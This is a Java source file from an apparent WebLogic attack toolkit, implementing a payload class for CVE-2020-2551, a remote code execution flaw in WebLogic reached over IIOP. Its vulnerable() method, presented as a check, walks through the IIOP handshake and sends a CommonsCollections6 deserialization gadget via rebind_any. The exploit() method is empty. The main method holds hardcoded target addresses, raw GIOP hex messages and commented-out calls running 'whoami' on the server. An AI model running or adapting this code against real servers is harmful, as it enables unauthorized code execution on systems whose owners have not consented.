package com.r4v3zn.weblogic.tools.payloads.impl;

import cn.hutool.core.util.HexUtil;
import com.r4v3zn.weblogic.tools.annotation.Authors;
import com.r4v3zn.weblogic.tools.payloads.ObjectPayload;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

import static com.r4v3zn.weblogic.tools.utils.IIOPUtils.*;
import static com.r4v3zn.weblogic.tools.utils.SocketUtils.*;
import static com.r4v3zn.weblogic.tools.utils.VersionUtils.getVersion;
import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: CVE_2020_2551
 * Descrption:
 * <p>
 *     攻击者可以通过 IIOP 协议远程访问 Weblogic Server 服务器上的远程接口，传入恶意数据，从而获取服务器 权限并在未授权情况下远程执行任意代码。
 *     漏洞影响版本:
 *     Oracle WebLogic Server 10.3.6.0.0
 *     Oracle WebLogic Server 12.1.3.0.0
 *     Oracle WebLogic Server 12.2.1.3.0
 *     Oracle WebLogic Server 12.2.1.4.0
 *     github: https://github.com/0nise/CVE-2020-2551
 * </p>
 * Date:2020/3/23 23:05
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 * @author R4v3zn
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN})
public class CVE_2020_2551 implements ObjectPayload {

    /**
     * rebind any ok 响应内容
     */
    public static final String REBIND_ANY_OK = "47494f50010200010000000c000000040000000000000000";

    /**
     * 漏洞影响版本
     */
    public static final List<String> VUL_VERSIONS = new ArrayList<String>(){{
        add("10.3.6.0.0");
        add("12.1.3.0.0");
        add("12.2.1.3.0");
        add("12.2.1.4.0");
    }};

    /**
     * 漏洞验证,漏洞存在返回 true 否则返回 false
     * @param ip ip
     * @param port 端口
     * @return 漏洞存在返回 true 否则返回 false
     */
    @Override
    public Boolean vulnerable(String ip, Integer port) throws Exception {
        // weblogic version
        String version = getVersion(ip, port);
        if(isBlank(version) || !VUL_VERSIONS.contains(version)){
            return false;
        }
        Socket socket = new Socket(ip, port);
        byte[] nameServiceByte = null;
        try{
            // step 1: op=LocateRequest
            nameServiceByte = getNameService(socket);
        }catch (Exception e){
            return false;
        }
        // name service hex
        String nameServiceHex = binaryToHexString(nameServiceByte);
        // name service str
        String nameServiceStr = new String(nameServiceByte);
        // get key
        String key = getKey(nameServiceHex, true);
        if(isBlank(key)){
            return false;
        }
        // get nat host
        String natHost = "iiop://" + getNatHost(nameServiceStr);
        // step 2: op=_non_existent (get new Key)
        byte[] nonExistentByte = operationNonExistent(socket, key, natHost);
        String newKey = getKey(binaryToHexString(nonExistentByte),false);
        if(!isBlank(newKey)){
            key = newKey;
        }
        // step 3: op=_non_existent
        operationNonExistent(socket, key, natHost, false);
        // op =rebind_any
        String bindName = "1bGpOMicmx6DLLIB";
        // op=rebind_any
        byte[] rebindAnyByte = rebindAnyCommonsCollections6(socket, bindName, key);
        String rebindAnyHex = binaryToHexString(rebindAnyByte);
        if(!REBIND_ANY_OK.equals(rebindAnyHex)){
            return false;
        }
        // step 4: op=resolve_any
        byte[] resolveAnyByte = resolveAny(socket, key, bindName);
        String resolveAnyHex = binaryToHexString(resolveAnyByte);
        // get new key
        newKey = getKey(resolveAnyHex, false);
        if(isBlank(newKey)){
            return false;
        }

        return null;
    }

    /**
     * 漏洞利用
     * @param ip ip
     * @param port 端口
     * @throws Exception 抛出异常
     */
    @Override
    public void exploit(String ip, Integer port) throws Exception {

    }

    public static void main(String[] args) throws Exception {
        ObjectPayload payload = new CVE_2020_2551();
        String ip = "192.168.1.12";
        Socket socket = new Socket(ip, 7001);
        String key = "00424541080103000000000c41646d696e53657276657200000000000000003349444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e67436f6e74657874416e793a312e3000000000000432383900000000014245412c000000100000000000000000e5b1d068fce4c4b8";
//        byte[] resolveAnyByte = resolveAny(socket, key, "j72QLEKYwFKoqebx");
//        String resolveAnyHex = binaryToHexString(resolveAnyByte);
        // /com.bea.javascript.jar
        System.out.println(HexUtil.encodeHexStr("192.168.1.6:8080"));
//        send("47494f5001020000000000b90000000603000000000000000000007800424541080103000000000c41646d696e53657276657200000000000000003349444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e67436f6e74657874416e793a312e3000000000000432383900000000014245412c000000100000000000000000e5b1d068fce4c4b80000000c7265736f6c76655f616e79000000000000000001000000107452364e4642376841697652523464590000000100",socket);
//        String resolveAnyHex = "47494f5001020001000002300000000600000000000000000000000e0000002d000000000000001d49444c3a6f6d672e6f72672f434f5242412f4f626a6563743a312e3000000000000000010000000000000044524d493a7765626c6f6769632e636c75737465722e73696e676c65746f6e2e436c75737465724d617374657252656d6f74653a3030303030303030303030303030303000000000010000000000000198000102000000000d3139322e3136382e312e313200001b590000008800424541080103000000000c41646d696e536572766572000000000000000044524d493a7765626c6f6769632e636c75737465722e73696e676c65746f6e2e436c75737465724d617374657252656d6f74653a30303030303030303030303030303030000000000432393500000000014245412c000000100000000000000000e5b1d068fce4c4b800000005000000010000002c0000000000010020000000030001002000010001050100010001010000000003000101000001010905010001000000190000003b0000000000000033687474703a2f2f3139322e3136382e312e31323a373030312f6265615f776c735f696e7465726e616c2f636c61737365732f00000000002000000004000000010000001f000000040000000300000021000000580001000000000001000000000000002200000000004000000000000806066781020101010000001f0401000806066781020101010000000f7765626c6f67696344454641554c540000000000000000000000000000000000";
//        String newKey = getKey(resolveAnyHex, true);
//        getServerLocation(socket, newKey, "whoami");
//        payload.vulnerable(ip, 7001);
    }
}
